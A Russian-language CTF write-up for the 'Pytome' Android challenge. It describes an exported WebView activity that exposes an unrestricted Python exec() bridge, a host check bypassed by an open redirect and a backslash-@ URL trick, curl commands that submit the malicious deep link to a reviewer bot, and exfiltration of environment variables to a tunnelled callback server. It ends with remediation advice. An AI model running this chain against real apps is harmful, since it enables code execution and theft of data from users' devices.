# Pytome — технический разбор

**Флаг:** `avito{pYThON_In_WEbv13w_1s_D4NGEroUs}`
**Класс:** Android / WebView bridge / arbitrary code execution

## Краткое техническое резюме

Exported `DocsActivity` загружает user-controlled URL в JavaScript-enabled WebView и публикует
`AndroidBridge.eval`. Bridge передаёт input в embedded CPython `exec()` без sandboxing. Application
валидирует только initial URL host; последующие WebView navigations не проходят origin validation.

Open redirect на trusted domain или URL parsing differential `\@` переводит WebView на attacker
origin, сохраняя native bridge. JavaScript вызывает Python, читает `os.environ['FLAG']` и отправляет
результат на callback server.

---

**Для воспроизведения:** Нужны работающий reviewer с Android WebView и публичный HTTPS-адрес сервера обратного вызова. Запуск страницы в обычном браузере не проверяет Android bridge.

## 1. Контекст и цель

Дан `pytome.apk` размером около 60 МБ и web service:

```text
https://pytome-57ymra6o.avitoctf.ru/
```

Задача требует извлечь runtime environment variable `FLAG` из application process на Android
устройстве reviewer bot. Значение не хранится статически в APK: `MainActivity` получает Intent extra
`FLAG` и записывает его в `os.environ`.

## 2. Разведка и поверхность атаки

Распаковка APK показывает embedded Chaquopy runtime:

- `lib/{arm64-v8a,x86_64,...}/libpython3.11.so`;
- `libchaquopy_java.so`, `libssl_python.so`;
- `assets/chaquopy/bootstrap.imy`, `stdlib-*.imy`, `app.imy`.

Application исполняет CPython 3.11 внутри Android process.

`AndroidManifest.xml` содержит:

- package `ru.avitoctf.pytome`;
- exported `MainActivity` и `DocsActivity`;
- `VIEW` intent filter со scheme `pytome` и host `docs`;
- permissions `INTERNET` и `DUMP`;
- `usesCleartextTraffic=true`.

Декомпиляция `classes.dex` через jadx выявляет:

```text
PythonEngine.execute(code) -> builtins.exec(code, ...)
DocsActivity              -> WebView.setJavaScriptEnabled(true)
DocsActivity              -> addJavascriptInterface(PythonBridge, "AndroidBridge")
PythonBridge.eval(code)   -> PythonEngine.execute(code)
```

Фильтрация modules, builtins или environment access отсутствует. Таким образом,
`AndroidBridge.eval` предоставляет arbitrary Python execution в security context приложения.

## 3. Анализ и проверка гипотез

### 3.1. Initial URL validation

`DocsActivity` доступна через deep link:

```text
pytome://docs?url=<target>
```

Перед `WebView.loadUrl` приложение проверяет, что host initial URL равен
`pytome-57ymra6o.avitoctf.ru`. Однако используется default `WebViewClient`; application не реализует
per-navigation validation в `shouldOverrideUrlLoading` и не удаляет JavaScript interface при смене
origin.

### 3.2. Origin transition

Проверку initial host можно удовлетворить двумя способами:

1. Trusted service предоставляет open redirect:

   ```text
   https://pytome-57ymra6o.avitoctf.ru/go?to=https://<callback-host>/x
   ```

2. URL `https://<callback-host>\@pytome-57ymra6o.avitoctf.ru/x` обрабатывается validator и Chromium
   по-разному. Callback server получает request path вида `/@pytome-.../x`, поэтому должен обслуживать
   payload на любом path.

В обоих случаях initial validation проходит, а финальный document загружается с attacker-controlled
origin при активном `AndroidBridge`.

### 3.3. Python execution и exfiltration

JavaScript payload вызывает bridge с Python expression:

```python
import os, json
print(json.dumps(dict(os.environ)))
```

`pytome/exploit_server.py` перебирает ожидаемые bridge object names и method names, чтобы не зависеть от
одного identifier. Результат отправляется на `/exfil` через XMLHttpRequest, `sendBeacon` и image
request. Callback server извлекает pattern `avito{...}` из полученного environment dump.

### 3.4. Доставка URL reviewer bot

Web form `/docs/bug-report` передаёт URL Android reviewer, в process которого уже установлена
переменная `FLAG`. Rate limit составляет приблизительно один report в минуту.

## 4. Корневая причина

Уязвимость формируется сочетанием нескольких issues:

1. exported Activity принимает externally controlled navigation target;
2. WebView исполняет JavaScript и публикует privileged native interface;
3. bridge предоставляет unrestricted Python `exec()`;
4. origin validation применяется только к initial URL;
5. bridge остаётся доступным после redirects и cross-origin navigation;
6. trusted origin предоставляет open redirect;
7. альтернативный URL parser path допускает authority parsing differential.

Security decision привязан к initial navigation, тогда как privileged bridge существует на
протяжении всей lifetime WebView. Это превращает любой origin transition в native code execution.

## 5. Эксплуатация

### 5.1. Callback server

```bash
uv run python pytome/exploit_server.py
# слушает http://127.0.0.1:8000
```

### 5.2. Публичный HTTPS endpoint

```bash
cloudflared tunnel --url http://localhost:8000
# https://<random>.trycloudflare.com
```

### 5.3. Отправка URL

Через parsing differential:

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'name=medoedik' \
  --data-urlencode 'email=medoedik@avito.ru' \
  --data-urlencode 'url=pytome://docs?url=https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x' \
  --data-urlencode 'bug_type=other' \
  --data-urlencode 'description=review'
```

Через open redirect:

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'url=pytome://docs?url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x'
```

Ожидаемый callback:

```text
[serve] path='/@pytome-...'
[FLAG] avito{pYThON_In_WEbv13w_1s_D4NGEroUs}
[full] {"FLAG":"avito{pYThON_In_WEbv13w_1s_D4NGEroUs}", ...}
```

Diagnostic result `NO_BRIDGE` означает, что payload был открыт обычным browser context, а не
уязвимой WebView.

## 6. Флаг

```text
avito{pYThON_In_WEbv13w_1s_D4NGEroUs}
```

## 7. Выводы и рекомендации

- Не следует публиковать privileged JavaScript interfaces для remote WebView content.
- Каждая navigation должна проходить scheme, host, port и origin validation; redirects необходимо
  валидировать по final destination.
- Activity с privileged WebView не должна быть exported без строгой authentication и input policy.
- Interpreter bridge должен использовать capability-restricted API вместо unrestricted `exec()`.
- Open redirects на allowlisted origins необходимо рассматривать как trust-boundary bypass.
- Для URL policy следует использовать тот же parser и canonical representation, что и navigation
  engine, включая проверки userinfo, backslash, Unicode и percent encoding.

## 8. Файлы для воспроизведения

В репозитории:

- `pytome/exploit_server.py` — catch-all payload server, bridge invocation и exfiltration receiver.

Исходный APK ожидается в `pytome/pytome.apk`. APK и generated tree `pytome/extracted/` не
входят в набор файлов в Git.
